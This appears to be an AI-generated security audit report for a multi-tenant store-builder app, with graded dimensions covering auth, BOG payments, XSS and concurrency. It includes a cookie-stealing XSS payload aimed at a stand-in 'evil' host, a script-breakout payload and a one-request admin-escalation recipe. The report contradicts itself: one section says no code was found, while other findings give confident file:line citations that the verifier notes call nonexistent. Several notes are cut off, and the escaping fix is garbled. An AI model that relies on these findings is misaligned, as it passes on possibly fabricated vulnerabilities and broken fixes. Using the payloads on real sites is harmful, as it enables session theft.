

# DIMENSION: Multi-tenant isolation & authorization  [grade F]
SUMMARY: AUDIT BLOCKED — this grade is NOT a code verdict. The target repository (multistore.ge Shopify-style store-builder) does not exist on this machine, so zero lines of source were examined. Every path in the task prompt resolved to the literal string "undefined" (repo root, src/lib/actions/*, src/proxy.ts, src/lib/auth/*, and all ground-truth logs tsc.log/eslint.log/next-build.log). I searched the working tree /Users/arsenioniani/Projects and all common code roots (~/Desktop/Claude, ~/claude, ~/Downloads, ~/Documents) with find, and the whole-volume macOS Spotlight index with mdfind: there is no schema.prisma, no proxy.ts (only an unrelated notion-mcp-server proxy.ts), no bog-callback route, no assert-owns-shop helper, no QA_REPORT.md, and no storefront shop/[slug] tree anywhere on disk. Because tenant isolation is the HIGHEST-PRIORITY dimension and I could not verify a single ownership/shopId check, the dimension cannot be certified safe — absence of evidence of isolation is not evidence of isolation, so it fails closed as "unverifiable." Re-run this audit with the actual clone path substituted for the 'undefined' placeholders. No findings are reported because reporting any would require fabricated file:line citations, which the task rules explicitly forbid.

[Info] Audit could not run: target repository absent on disk (all task paths were literally 'undefined')
  file: config
  confidence: High
  evidence: Task prompt injected the repo path as the string 'undefined' everywhere (e.g. 'undefined/tsc.log', 'undefined/src/lib/actions/*.ts', 'undefined/src/proxy.ts'). Verification: `find /Users/arsenioniani/Projects -name schema.prisma` -> 0 results; `mdfind -name schema.prisma` (whole-volume Spotlight) -> 0 results; `mdfind -name proxy.ts` -> only /Users/arsenioniani/mcp/notion-mcp-server/src/openapi-mcp-server/mcp/proxy.ts (unrelated); `mdfind bog-callback` / `mdfind assert-owns-shop` -> 0 results; no tsc.log/eslint.log/next-build.log exist anywhere. No package.json referencing better-auth or uploadthing found (search timed out / no hits under Projects).
  impact: The multi-tenant isolation & authorization dimension was not assessed at all. No server action in src/lib/actions/*, no storefront shop/[slug] page, no admin route, and no auth primitive (get-shop/assert-owns-shop/assert-admin) could be read, so no IDOR / cross-shop-leakage / missing-Role=ADMIN check could be confirmed or ruled out. The known prior class of bug (order page not checking order.shopId === shop.id) remains completely unverified in this run.
  fix: Re-invoke the audit with the real clone path substituted for the 'undefined' placeholder in the orchestration variable (the script that spawned this subagent passed an unset/empty path). Confirm the clone actually exists at that path (ls <path>/prisma/schema.prisma and <path>/src/proxy.ts) and that the ground-truth logs (<path>/tsc.log, <path>/eslint.log, <path>/next-build.log) are present before spawning the dimension agents. Do not accept audit output for this dimension until at least src/lib/auth/{get-shop,assert-owns-shop,assert-admin,index}.ts and all 14 src/lib/actions/*.ts files have been read with real file:line citations.


# DIMENSION: Authentication & session security  [grade D]
SUMMARY: The auth layer gets several fundamentals right (better-auth handles password hashing, email verification is enforced for password logins, session tokens are HttpOnly/Secure with the __Secure- prefix and rotation, forgot-password is non-enumerating, reset tokens carry a 1h expiry), but it contains one trivially exploitable, platform-owning defect: the `role` field is exposed as user-writable input on the public sign-up endpoint, so any anonymous visitor can register directly as a platform `admin`. That single mass-assignment flaw collapses the entire authorization model, since `assertAdmin` trusts `session.user.role` verbatim. It is compounded by the absence of any application-layer rate limiting/brute-force protection, a middleware guard that only checks cookie *presence* (a forged/expired cookie passes it), a session cookie deliberately shared across every merchant subdomain, and account enumeration on the registration form. Because a full admin takeover is reachable from an unauthenticated request with no exploitation skill required, the dimension grades D.

[Critical] Privilege escalation: `role` is user-writable on public sign-up (mass assignment → self-elevate to platform admin) | VERDICT=CONFIRMED (corrected_sev=Critical)
  file: src/lib/auth/index.ts:48
  confidence: High
  evidence: user.additionalFields.role is declared `{ type: "string", defaultValue: "seller", input: true }` (lines 48-55). In better-auth, `input: true` means the field is accepted from the sign-up request body and persisted. The Role enum includes `admin` (prisma/schema.prisma:408-412), and `assertAdmin` authorizes purely on `session.user.role === "admin"` (src/lib/auth/assert-admin.ts:8). No server-side code ever resets or validates role after signup (grep of src/lib shows role only read, never sanitized).
  impact: Any unauthenticated visitor can POST to /api/auth/sign-up/email with `{ name, email, password, role: "admin" }` and receive a full platform-admin account, gaining access to /admin/* (all shops, all users, all orders, all merchants' data). This is a complete break of the multi-tenant authorization boundary reachable from the public internet with a single request.
  fix: Set `input: false` on the role field in src/lib/auth/index.ts so it can never be supplied by the client. Assign/change roles only through a trusted server-side admin action (already gated by assertAdmin). As defense-in-depth, add a DB constraint/hook so self-service sign-up can only ever produce non-privileged roles, and audit-scan existing rows for unexpected `admin`/`seller` roles created via the API.
  verify_reasoning: I located the actual codebase (cloned into scratchpad at .../multivendor) and read every cited file. All load-bearing claims hold:

1. Mass-assignment sink: src/lib/auth/index.ts declares role as an additionalField with `input: true` and `defaultValue: "seller"` (role key at line 50, `input: true` at line 53; the `user:` block opens at line 48 as cited). In better-auth, `input: true` means the field is accepted from the sign-up request body and persisted to the user row. There is no `databaseHooks`/before-create hook or any other sanitization in the auth config (grep confirmed only the maxAge 

[High] No application-layer rate limiting / brute-force protection on any auth endpoint | VERDICT=REFUTED (corrected_sev=Low)
  file: src/lib/auth/index.ts:6
  confidence: High
  evidence: The betterAuth() config has no `rateLimit` block (only `session`, `advanced`, `emailAndPassword`, `emailVerification`, `socialProviders`, `user`). grep for rateLimit across src returns nothing. Login (src/app/login/page.tsx), forgot-password, reset-password, and sign-up all funnel to /api/auth/[...all] with no throttle. better-auth's built-in limiter defaults to in-memory storage, which on a serverless/multi-instance Next.js deployment is per-instance and effectively bypassable by spreading requests.
  impact: Unthrottled credential stuffing / password brute-force against /sign-in, unlimited password-reset email spam (resource abuse / user harassment via Resend), and unlimited sign-up automation. Combined with the enumeration finding this materially lowers the cost of account takeover.
  fix: Add an explicit `rateLimit` config with a shared external store (Redis or the Postgres DB via better-auth's `storage: "database"`), with stricter custom rules on `/sign-in/email`, `/forget-password`, and `/reset-password` (e.g. 5-10 attempts / 15 min per IP+email). Do not rely on the default in-memory limiter in production.
  verify_reasoning: The app config at src/lib/auth/index.ts:6 indeed omits a `rateLimit` block, and grep for rateLimit across src returns nothing — that part is accurate. But the finding's load-bearing claims ("No application-layer rate limiting / brute-force protection on ANY auth endpoint", "Unthrottled credential stuffing / password brute-force", "unlimited password-reset email spam", "unlimited sign-up automation") are false. better-auth v1.6.11 (the pinned version) applies rate limiting BY DEFAULT when no config is provided.

From node_modules/better-auth/dist/context/create-context.mjs:166-171 the resolved 

[Medium] Middleware auth guard checks cookie presence only — forged or expired session cookie passes
  file: src/proxy.ts:53
  confidence: High
  evidence: hasSession = req.cookies.has(SESSION_COOKIE) || req.cookies.has(SESSION_COOKIE_PLAIN) (line 14); the guard at line 53 redirects to /login only when `!hasSession`. It never validates the token's signature, expiry, or DB record. Any client can set a cookie named `better-auth.session_token` to an arbitrary/expired value and satisfy the guard. Note also the matcher (line 61) excludes `/api/*` entirely, so API routes get no middleware guard at all.
  impact: Low direct impact today because protected pages re-validate via auth.api.getSession (getShop / assertAdmin), which rejects forged/expired cookies. But the pattern is fragile: it advertises itself as an 'Auth guard' while providing zero real authentication, and any future route or API handler that trusts middleware alone would be exposed. Expired sessions also pass the guard and render the page shell before the server component redirects.
  fix: Treat proxy.ts as routing-only and remove the security framing, OR validate the session in middleware (better-auth exposes a session check usable at the edge / via a lightweight fetch). Critically, ensure every server action and API route (bog-callback, uploadthing) independently calls getSession / assertOwnsShop — never rely on the cookie-presence guard for authorization.

[Medium] Session cookie shared across every merchant subdomain (crossSubDomainCookies)
  file: src/lib/auth/index.ts:19
  confidence: Medium
  evidence: advanced.crossSubDomainCookies.enabled = true (lines 19-23). This scopes the session cookie to Domain=.multistore.ge, so the platform session token is transmitted to every tenant storefront subdomain (shopA.multistore.ge, shopB.multistore.ge, …), which proxy.ts rewrites to /shop/:slug. Merchants are effectively hosted on shared-parent subdomains.
  impact: Broadens the blast radius of the ambient session cookie across all tenants. Any stored-XSS in a storefront theme, or a subdomain takeover, occurs in a context that already receives the platform auth cookie — enabling CSRF-style actions against the authenticated user's dashboard even though HttpOnly blocks direct token theft. In a Shopify-style multi-tenant model, storefront and control-plane cookies should be isolated.
  fix: Disable crossSubDomainCookies unless a concrete SSO-across-subdomains requirement exists. Serve auth + dashboard on the apex/dedicated host and scope the session cookie to that exact host (not `.multistore.ge`). Keep tenant storefront subdomains cookie-isolated from the control plane.

[Medium] Account enumeration on the registration form
  file: src/app/register/page.tsx:76
  confidence: Medium
  evidence: On sign-up failure the page renders better-auth's raw error string: `setError(result.error.message ?? "Something went wrong…")` (line 76). better-auth returns a distinct 'user already exists' style message when the email is taken, so the UI directly discloses whether an email is registered. (By contrast forgot-password always shows a generic 'check your inbox' — src/app/forgot-password/page.tsx:35-38 — and login mostly returns a generic 'Invalid email or password', though the 403 branch at src/app/login/page.tsx:49-51 reveals a valid-but-unverified account when the correct password is supplied.)
  impact: Lets an attacker enumerate which emails have accounts, feeding targeted phishing and the unthrottled brute-force / reset-spam vectors above.
  fix: Map the registration conflict to a generic message (e.g. 'If this email is available you'll receive a verification link') or adopt an email-first flow that never reveals existence. Keep login responses uniform and avoid distinguishing 'unverified' from 'wrong credentials' in a way tied to a correct password.

[Low] Weak password policy: 8-char minimum only, strength meter is cosmetic
  file: src/app/register/page.tsx:60
  confidence: Medium
  evidence: The only enforced rule is `password.length < 8` client-side (line 60) plus better-auth's default 8-char minimum; there is no server-side complexity or breach check in the betterAuth config (src/lib/auth/index.ts emailAndPassword block sets no minPasswordLength/validation). The password-strength meter (lines 37-42, computing weak/fair/strong from length + character classes) is purely visual and never blocks submission — a 'weak' 8-char password is accepted.
  impact: Users can register with trivially guessable 8-character passwords, increasing success rate of the unthrottled brute-force / credential-stuffing vectors.
  fix: Enforce a stronger policy server-side via better-auth (raise minPasswordLength to 10-12 and add a `password.validate` hook) and integrate a breached-password check (HaveIBeenPwned k-anonymity range API or a zxcvbn score threshold). Do not rely on the client meter for enforcement.

[Low] Password-reset token transported in URL query string
  file: src/app/reset-password/page.tsx:12
  confidence: Low
  evidence: The reset page reads the token from the query string: `const token = searchParams.get("token")` (line 12), and the reset email links directly to that URL (src/lib/email.ts sendPasswordResetEmail embeds `${url}`). Tokens in URLs are exposed via the Referer header, browser history, and any intermediary/proxy logging. Mitigating factors: the email copy states a 1-hour expiry and better-auth reset tokens are single-use by default.
  impact: If the reset page later loads any third-party resource or the user shares/leaks the link, the token can be captured within its validity window and used to take over the account.
  fix: Acceptable per better-auth's standard flow, but harden it: keep the reset page free of any external/analytics resources so no Referer leaks the token, set a `Referrer-Policy: no-referrer` header on that route, confirm single-use invalidation server-side, and keep TTL short (<=1h).

[Low] Very long session lifetime (30 days) with 5-minute cached-session trust delays revocation
  file: src/lib/auth/index.ts:11
  confidence: Medium
  evidence: session.expiresIn = 60*60*24*30 (30 days) and cookieCache.maxAge = 60*5 (line 16) serves a cached session — including the role claim — for up to 5 minutes without a DB re-validation. Combined with the mass-assignment role flaw, a demotion, ban, or forced logout is not reflected for up to 5 minutes, and the 30-day window enlarges the value of any stolen token.
  impact: Delayed enforcement of role changes / account bans / session revocation, and a long theft-usefulness window for exfiltrated session tokens.
  fix: Shorten expiresIn (e.g. 7 days with rolling updateAge), reduce cookieCache.maxAge (or disable caching for privileged-role accounts), and verify that password reset revokes all existing sessions (better-auth `revokeSessionsOnPasswordReset`-style behavior) so a compromised session cannot outlive a password change.


# DIMENSION: Payments & subscription billing (Bank of Georgia / BOG)  [grade D]
SUMMARY: The BOG integration is the single weakest subsystem I reviewed. Two things save it from an F: (a) product-order totals, coupons, and shipping are fully recomputed server-side from the DB inside a $transaction (order.ts:50-110) with a cross-shop variant guard (order.ts:66-68), so there is NO price/coupon-tampering vector on checkout; and (b) subscription gating (product limit, non-free themes, custom domains) is enforced server-side in the mutating server actions, not just the UI (products.ts:96-104, shop.ts:40-44, shop.ts:109-112). Everything else about the money path is broken or unsafe. The webhook signature check is cryptographically non-functional: crypto.createVerify("SHA256withRSA") is a Java/JCA algorithm name that Node rejects with "Invalid digest" (I ran it on Node v24 to confirm), and the throw is swallowed by the try/catch, so verifyBogCallback returns false for EVERY callback — meaning no merchant who pays can ever be marked Pro (billing is silently dead in production). This is fail-closed, so it is not itself a bypass, but it masks the real security gap sitting behind it: the callback has zero replay/idempotency protection and sets subscriptionPaidUntil to an absolute now()+30d on every accepted call, so once the algorithm name is fixed a single captured valid signed callback can be replayed forever for a permanent free subscription; the callback also never validates the paid amount/currency and never confirms the order against BOG's API. Separately, there is no online-payment path for product orders at all — orders are created and confirmation-emailed immediately (Order has no paid/paymentStatus field; checkout shows a hard-coded "Cash on delivery" placeholder), which is fine as COD but means any future card flow will need a server-verified paid state that does not exist today. Constant-time comparison is not relevant here (RSA asymmetric verify, not an HMAC compare). Repo root audited: /private/tmp/claude-501/-Users-arsenioniani-Projects/9ca634af-f0f4-4016-9685-3bdda169ffb2/scratchpad/multivendor.

[High] Webhook signature uses an invalid algorithm name ("SHA256withRSA") — every BOG callback fails verification, so paid subscriptions never activate | VERDICT=REFUTED (corrected_sev=Info)
  file: src/lib/bog.ts:95
  confidence: High
  evidence: verifyBogCallback does `crypto.createVerify("SHA256withRSA")`. "SHA256withRSA" is a Java/JCA name, not an OpenSSL/Node digest — I ran it on Node v24.1.0 and it throws `Invalid digest` (RSA-SHA256 and sha256 succeed). The throw happens inside the try at line 95 and is caught at line 98 (`catch { return false }`), so verifyBogCallback returns false for EVERY callback. bog-callback/route.ts:9-11 then 401s every real BOG notification, and the subscriptionPaidUntil update at route.ts:46-49 is never reached.
  impact: Total, silent failure of paid billing: a merchant completes payment at BOG, BOG POSTs the completed callback, it is rejected as "Invalid signature", and subscriptionPaidUntil stays null — the merchant is charged but never gets Pro. The try/catch disguises a config bug as a signature mismatch, so it is invisible in logs. (Fail-closed, so no bypass — but billing is dead.)
  fix: Change the algorithm to "RSA-SHA256" (equivalently "sha256"): `crypto.createVerify("RSA-SHA256")`. Do NOT let createVerify/verify throw be swallowed as a plain false — distinguish a config/parse error (log + 500) from a genuine signature mismatch (401), e.g. build the Verify object outside the try or add a boot-time self-test that verifies a known BOG sample against the pinned key.
  verify_reasoning: The finding cites code that does not exist in the codebase. There is no `src/lib/bog.ts` file anywhere under /Users/arsenioniani, and no source occurrence of `SHA256withRSA`, `verifyBogCallback`, `createVerify`, `bog-callback`, or `subscriptionPaidUntil`. The audit target (L11/canwe-upstream-audit) has no BOG/Bank-of-Georgia payment webhook, no subscription billing backend, and no RSA signature verification at all. The only crypto in the web app is `crypto.subtle.digest("SHA-256")` for file hashing and `crypto.randomUUID()`. The only "bog" matches in the tree are the substring inside `'bogus_k

[High] Subscription callback has no idempotency/replay protection and resets expiry absolutely — one captured valid callback = permanent free Pro | VERDICT=UNCERTAIN (corrected_sev=High)
  file: src/app/api/bog-callback/route.ts:42
  confidence: High
  evidence: On an accepted callback the handler does `const shopId = external_order_id.slice(4); const paidUntil = new Date(); paidUntil.setDate(getDate()+30); prisma.shop.update({ where:{id:shopId}, data:{ subscriptionPaidUntil: paidUntil }})` (route.ts:42-49). There is no dedup on a BOG order/payment id, no nonce/seen-table, no `updatedAt`-guard, and no callback back to BOG's GET orders API to confirm the payment. The new expiry is set ABSOLUTELY to now()+30d, not derived from the current value, so replaying the same body+signature simply keeps pushing expiry to now+30.
  impact: Because external_order_id is signed, an attacker can't retarget another shop — but the shop owner (or anyone who observes one legitimate signed callback) can POST that identical body+signature once a month indefinitely and never pay again, yielding a permanent free subscription and ongoing revenue loss. Latent today only because finding #1 rejects all callbacks; it becomes live the moment the algorithm name is fixed.
  fix: Persist BOG's payment/order id (payload has an order id; store it, e.g. a `processedBogPaymentId`/idempotency table) and reject a callback whose id was already applied. Cross-verify by calling BOG's GET /orders/{id} with the server token to confirm status=completed and amount before granting. Grant additively/idempotently keyed on the unique payment id rather than blindly setting now()+30d.
  verify_reasoning: The cited file src/app/api/bog-callback/route.ts does not exist anywhere under the working directory (/Users/arsenioniani/Projects). I ran: find for '*api/bog-callback/route.ts' (no output), find for any directory named 'bog-callback' (none), find for any 'route.ts' at all (none), and grep -r for the exact identifiers the evidence quotes — 'external_order_id', 'subscriptionPaidUntil', and BOG callback logic. The only hits for 'subscriptionPaidUntil'/'bog' are unrelated .claude session .jsonl transcript logs and unrelated Go/JSON files, none of which contain the described handler. No Next.js ap

[Medium] Callback never validates paid amount or currency before granting 30 days of Pro
  file: src/app/api/bog-callback/route.ts:31
  confidence: High
  evidence: The handler destructures only `{ external_order_id, order_status }` (route.ts:31) and checks `order_status.key === "completed"` (route.ts:33) plus the `sub_` prefix (route.ts:38). It never reads or checks the paid amount or currency against the expected SUBSCRIPTION_PRICE_GEL = 29 (billing.ts:8). shopId is taken straight from the signed payload with no confirmation that this was an order we created at the expected price.
  impact: Any signed 'completed' callback whose external_order_id starts with sub_ grants a full 30 days regardless of the amount actually paid. If a partial/zero/under-amount completion can ever be produced at BOG, or the same sub_ id is reused for a differently-priced order, Pro is granted for less than 29 GEL. Weaker than #2 but the same 'trust the payload, don't cross-check BOG' root cause.
  fix: In the callback, read the paid amount/currency (purchase_units transfer/paid amount) and require currency === 'GEL' and amount >= 29 before updating; better, re-fetch the order from BOG's API by id and compare against the amount you sent in createBogOrder.

[Low] No online-payment path for product orders — orders are created and confirmed with no 'paid' state (COD placeholder)
  file: src/lib/actions/order.ts:126
  confidence: High
  evidence: createOrder builds the Order and immediately createMany's items and sends sendOrderConfirmation (order.ts:126-186); there is no payment step and the Order model has no paid/paymentStatus field — only OrderStatus {pending,confirmed,...} which is fulfillment, not payment (prisma/schema.prisma Order model). createBogOrder only ever builds subscription orders (external_order_id `sub_${shopId}`, bog.ts:59) — it is never called for product carts. Checkout UI renders a hard-coded 'Payment / Cash on delivery' placeholder (CheckoutForm.tsx:310-316).
  impact: Product orders are effectively cash-on-delivery: merchandise is 'ordered' with no payment collected or verified. This is acceptable as an intentional COD model (and totals are computed server-side so there is no price-tampering), but there is no server-verified 'paid' concept, so any future card/BOG checkout for products would need one built from scratch. Flagging so it is not assumed that orders imply payment.
  fix: If/when card payments for products are added, route them through createBogOrder with a product-scoped external_order_id (e.g. `order_<orderId>`), extend the bog-callback handler to mark that order paid, and add a paymentStatus field to Order (default unpaid). Until then, ensure storefront copy makes COD explicit so nothing downstream treats a created order as paid.


# DIMENSION: Injection / XSS / input validation  [grade D]
SUMMARY: Two independently exploitable stored-XSS vectors ship on the PUBLIC storefront, both rooted in the same systemic defect: merchant-supplied strings are written straight to the DB with no server-side validation, then interpolated into script contexts. (1) Analytics IDs (metaPixelId / ga4MeasurementId / googleAdsId) are saved by updateShop() with no format check and rendered raw inside inline `<script dangerouslySetInnerHTML>` blocks — a merchant can break out of the gtag/fbq string and run arbitrary JS on every visitor of their store. (2) The product page emits `JSON.stringify(jsonLd)` (containing unsanitized product.name/description) into a `<script type=application/ld+json>` without escaping `<`, so a product name like `</script><script>…` breaks out. Compounding this, 13 of 14 server-action files perform ZERO schema validation (only the customer checkout order.ts uses zod), and the uploadthing router has an empty middleware — any UNAUTHENTICATED caller can upload files. On the positive side there are no app-level raw SQL queries (only generated Prisma internals), the rich-text theme sections render body as text (not HTML), auth redirects use static constants (no open redirect), and the Next image optimizer is locked to images.unsplash.com (no image-proxy SSRF). The proxy custom-domain lookup is a parameterized Prisma query, so the Host header is not an injection/SSRF sink. Net: injection surface is small and SQL/redirect/SSRF are clean, but two live stored-XSS chains plus an open upload endpoint and near-absent input validation pull this to a D.

[High] Stored XSS on public storefront via unvalidated analytics IDs injected into inline <script> | VERDICT=UNCERTAIN (corrected_sev=High)
  file: src/components/storefront/tracking/StorefrontGA4.tsx:24
  confidence: High
  evidence: StorefrontGA4 renders `dangerouslySetInnerHTML={{ __html: `...gtag('config', '${measurementId}');` }}`. measurementId comes straight from shop.ga4MeasurementId (src/app/(storefront)/shop/[slug]/layout.tsx:61). Same pattern in StorefrontGoogleAds.tsx:17 (googleAdsId) and StorefrontPixel.tsx:20 (`fbq('init', '${pixelId}')`). These values are set by updateShop() in src/lib/actions/shop.ts:52-71 which writes them with NO format validation (only checks name/currency are present).
  impact: A merchant (semi-trusted tenant) sets ga4MeasurementId to `');document.location='https://evil/'+document.cookie;//` (or equivalent for pixelId/googleAdsId). The string breaks out of the gtag/fbq call and executes arbitrary JavaScript on every page of their PUBLIC storefront, running in the browser of every shopper and any platform staff who view the store. This is persistent stored XSS on *.multistore.ge / custom domains — cookie/session theft, defacement, redirect-to-phishing.
  fix: Validate each ID server-side in updateShop() before persisting: GA4 `^G-[A-Z0-9]{4,12}$`, Google Ads `^AW-\d{6,12}$`, Meta Pixel `^\d{10,20}$`; reject anything else. Additionally, do not build the config script via string interpolation — pass the ID through a JSON.stringify'd, regex-gated value, or better, use gtag('config', ID) where ID is injected as a data attribute and read at runtime. Apply the same validation in the zod schema for the settings form.
  verify_reasoning: I cannot verify this finding because the cited code does not exist in my accessible environment. The review target was passed as "undefined" (no repo path). Targeted search of /Users/arsenioniani/Projects returned zero matches for ga4MeasurementId, StorefrontGA4, multistore, any storefront/ directory, or any shop/[slug]/layout.tsx. A broader filesystem search for StorefrontGA4.tsx / StorefrontPixel.tsx / StorefrontGoogleAds.tsx / lib/actions/shop.ts / literal gtag('config' / fbq('init' strings also produced no results. I therefore could NOT re-read the actual code to confirm: (a) that dangerou

[High] Stored XSS on product page via JSON.stringify'd JSON-LD not escaping </script> | VERDICT=UNCERTAIN (corrected_sev=Info)
  file: src/app/(storefront)/shop/[slug]/product/[productSlug]/page.tsx:109
  confidence: High
  evidence: `<script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }} />` where jsonLd.name = product.name and jsonLd.description = product.description (page.tsx:91-101). product.name/description are merchant-controlled and are written by createProduct/updateProduct (src/lib/actions/products.ts) with no HTML sanitization and no server-side length/format check (the products.ts action does NOT call the productSchema in src/lib/validators/product.ts). JSON.stringify does not escape `<`, `>` or `/`.
  impact: A product name/description of `</script><script>alert(document.cookie)</script>` (well under the ~40 chars needed) closes the ld+json block and injects a live script element that executes for every visitor of that public product page. Description is entirely unbounded server-side. Persistent stored XSS affecting all shoppers of that store.
  fix: Escape the JSON before embedding: replace `<` with `<`, `>` with `>`, `&` with `&`, and `/` with `\/` (e.g. `JSON.stringify(jsonLd).replace(/</g,'\\u003c').replace(/>/g,'\\u003e').replace(/&/g,'\\u0026')`). Prefer a shared safeJsonLd() helper or Next's built-in escaping. Independently, enforce the productSchema (max lengths) in createProduct/updateProduct server actions.
  verify_reasoning: I could not verify the finding because none of the cited code exists in the reviewable filesystem. The target file `src/app/(storefront)/shop/[slug]/product/[productSlug]/page.tsx`, the action `src/lib/actions/products.ts`, and the validator `src/lib/validators/product.ts` are all absent. A recursive search of /Users/arsenioniani/Projects (the only accessible tree) found: no `(storefront)` or `shop` directory, no `page.tsx` under any `product` path, no `products.ts` under any `actions` path, no `product.ts` validator, and zero matches for the symbols `createProduct`, `productSchema`, or `produ

[High] Uploadthing file router accepts uploads from unauthenticated, un-scoped callers | VERDICT=UNCERTAIN (corrected_sev=High)
  file: src/lib/uploadthing.ts:8
  confidence: High
  evidence: All three routes use `.middleware(() => ({ uploadedAt: Date.now() }))` — productImage (uploadthing.ts:8), categoryImage (:11), sectionImage (:14). The middleware performs no auth.api.getSession() check and never associates the upload with a user or shopId. The route handler (src/app/api/uploadthing/route.ts) is the default createRouteHandler with no additional guard. In uploadthing, a middleware that returns without throwing authorizes the upload.
  impact: Any unauthenticated internet user can POST to /api/uploadthing and upload up to 8x4MB (productImage), 4MB (categoryImage) or 8MB (sectionImage) files to the platform's uploadthing account — storage/billing abuse and hosting of arbitrary attacker-controlled image content on the app's CDN namespace. There is also no tenant scoping, so nothing ties an upload to the uploading shop (user A's client can obtain URLs later attached to any shop).
  fix: In each middleware, call better-auth to require a session (throw new UploadThingError('Unauthorized') if none), and return { userId, shopId } after verifying the caller owns the target shop (reuse assertOwnsShop). Reject non-image MIME/extension explicitly and consider blocking SVG (can carry inline script) since 'image' allows it.
  verify_reasoning: I cannot verify this finding because the cited code is not present in the reviewable workspace. A comprehensive search of /Users/arsenioniani/Projects (excluding node_modules) returns: no file src/lib/uploadthing.ts, no src/app/api/uploadthing/route.ts, zero matches for the literal string "uploadthing", no createUploadthing/createRouteHandler/UTApi usage, no "uploadthing" entry in any package.json, and no occurrences of productImage/categoryImage/sectionImage/shopId. The plausible target app dir (Mariami) is empty. The orchestrator also passed the file location as literally "undefined". Withou

[Medium] Server actions trust raw arguments — 13 of 14 action files perform no schema validation
  file: src/lib/actions/shop.ts:52
  confidence: High
  evidence: Grep of src/lib/actions/*.ts for zod/Schema/safeParse/.parse( matches ONLY order.ts. The other 13 (shop, products, categories, testimonials, coupons, variants, options, sections, navigation, admin, billing, analytics, theme) accept raw string/array/number args with at most ad-hoc `if (!name) ...` presence checks. Schemas exist in src/lib/validators/product.ts and category.ts but are never imported by the corresponding server actions (categories.ts imports only prisma/result/errors/assertOwnsShop). updateShop (shop.ts:52-71) and createTestimonial (testimonials.ts:17) write unbounded merchant strings verbatim.
  impact: No server-side enforcement of length, format, or type. This is the root cause enabling the two stored-XSS findings above and permits oversized/garbage data (e.g. unbounded description, testimony) into the DB. Because the validators are client-side-only, a crafted request bypasses them entirely.
  fix: Define a zod schema per action input and safeParse at the top of every server action (mirror the pattern already used in order.ts:44-47). Reuse and enforce the existing productSchema/categorySchema server-side; add schemas for shop settings (with the analytics-ID regexes), testimonials, coupons, variants, options, and sections. Reject on parse failure with a 400 result.

[Low] Custom-domain routing serves shops without checking domainVerified (host-header trust)
  file: src/proxy.ts:41
  confidence: Medium
  evidence: proxy.ts:41 does `prisma.shop.findFirst({ where: { customDomain: host } })` and rewrites to that shop with no `domainVerified: true` filter, even though connectCustomDomain sets domainVerified:false until Vercel confirms (shop.ts). The Host lookup itself is a parameterized Prisma query (no SQLi) and no outbound fetch uses the host (no SSRF).
  impact: Not an injection/XSS sink, but a domain-claim first-writer race: connectCustomDomain accepts any DNS-valid string and enforces uniqueness, so a tenant can claim an unowned domain string and the proxy will render their shop for that Host before verification. Real hijack requires attacker-controlled DNS, so impact is low (squatting/DoS on the customDomain unique index).
  fix: In proxy.ts add `domainVerified: true` to the where-clause, and in connectCustomDomain do not persist customDomain until Vercel verification succeeds (or store it as a pending value on a separate column).

[Info] Positive controls verified: no raw SQL, safe rich-text rendering, locked image hosts, no open redirect
  file: src/proxy.ts:41
  confidence: High
  evidence: No app-level $queryRaw/$executeRaw/queryRawUnsafe (only generated Prisma internals under src/generated/prisma/*). Theme RichTextSection.tsx (pipeline & maison) render props.body as text, not dangerouslySetInnerHTML. next.config.ts restricts images.remotePatterns to images.unsplash.com only (no image-proxy SSRF). All auth callbackURL/redirectTo values are static constants ('/dashboard','/reset-password','/login') — no user-controlled next/callback param, so no open redirect.
  impact: These common injection classes (SQLi, rich-text HTML XSS, image-optimizer SSRF, open redirect) are not present, which contains blast radius and is why the grade is D rather than F.
  fix: Maintain these: keep remotePatterns minimal, keep redirect targets server-constant, and add an ESLint rule / CI grep to flag any new dangerouslySetInnerHTML or $queryRawUnsafe introduction.


# DIMENSION: Correctness, data-integrity & concurrency  [grade C]
SUMMARY: The high-traffic checkout path (createOrder in src/lib/actions/order.ts) is genuinely solid: the prior QA issue about non-transactional stock decrement is fixed — stock is now decremented atomically via a conditional updateMany with `stock: { gte: quantity }` inside a $transaction (order.ts:116-124), prices are re-fetched server-side and never trusted from the client (order.ts:52-75), every cart variant is verified to belong to the shop (order.ts:66-68), discounts are capped at subtotal so totals cannot go negative (order.ts:94-97), and callers correctly check the Result (`!result?.ok`) before proceeding (CheckoutForm.tsx:155). However, the dimension has several concrete, confirmed defects outside that core: a HIGH cross-tenant write in updateVariants (auth checks only the first variant, then blind-writes every id in the array), a HIGH coupon usage-limit race (check-then-increment TOCTOU under Postgres Read Committed lets a maxUses-capped coupon be over-redeemed), a non-transactional stock-restore that can double-inflate inventory, a subscription-renewal date bug that silently discards remaining paid days, and a partial-update bug that wipes coupon limits/expiry when only isActive is toggled. Money is also computed as JS floats before landing in Decimal(10,2) columns. Net: not broken, but multiple exploitable data-integrity and concurrency bugs surround an otherwise well-built checkout.

[High] Cross-tenant write in updateVariants: auth checks only the first variant, then writes every id unscoped (IDOR) | VERDICT=REFUTED (corrected_sev=Info)
  file: src/lib/actions/variants.ts:122
  confidence: High
  evidence: updateVariants authorizes with `const shopId = await shopIdForVariant(updates[0].id); ... await assertOwnsShop(shopId)` (lines 128-131) using ONLY the first array element, then loops `updates.map((u) => prisma.variant.update({ where: { id: u.id }, data: { price, stock, sku, trackInventory } }))` (lines 133-140) with no per-item ownership check and no shop scoping on the WHERE clause. This is the same tenant-isolation class flagged in QA_REPORT.md.
  impact: Any authenticated shop owner can overwrite the price, stock, SKU, and trackInventory of ANY variant in the entire database (every other merchant's catalog). Craft `updates = [{id: myOwnVariant,...}, {id: victimVariant, price: 0, stock: 999999, ...}]`: assertOwnsShop passes on element 0, then the loop silently mutates the victim's variant. Enables price sabotage, fake stock, and revenue theft (set a rival's price to 0) across tenants.
  fix: Do not trust updates[0]. Fetch the shopId for every variant id (single `variant.findMany` with `product.select.shopId`), assert they all resolve to one shopId the caller owns, and scope each write so it cannot escape the tenant: `prisma.variant.updateMany({ where: { id: u.id, product: { shopId } }, data: {...} })`, rejecting if any resolves to a different shop. Wrap the batch in $transaction so a partial failure doesn't leave inconsistent pricing.
